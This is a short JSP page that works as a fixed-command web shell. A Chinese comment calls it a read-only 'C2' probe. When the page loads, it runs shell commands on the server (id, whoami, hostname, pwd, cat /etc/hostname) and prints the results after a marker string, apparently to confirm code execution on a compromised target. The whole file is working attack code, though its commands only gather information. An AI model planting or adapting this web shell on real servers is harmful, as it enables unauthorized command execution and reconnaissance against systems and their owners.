<%@ page import="java.io.*" %><%
// loop3 t7 C2 只读探测用 JSP —— 仅执行只读命令，不写文件、不反弹 shell
String[] cmds = {"/bin/sh","-c","id; whoami; hostname; pwd; cat /etc/hostname"};
Process p = Runtime.getRuntime().exec(cmds);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
StringBuilder sb = new StringBuilder();
String l;
while ((l = br.readLine()) != null) sb.append(l).append("\n");
BufferedReader eb = new BufferedReader(new InputStreamReader(p.getErrorStream()));
String e;
while ((e = eb.readLine()) != null) sb.append("[err]").append(e).append("\n");
out.println("LOOP3T7C2READONLY=" + sb.toString().trim().replace("\n","|"));
%>
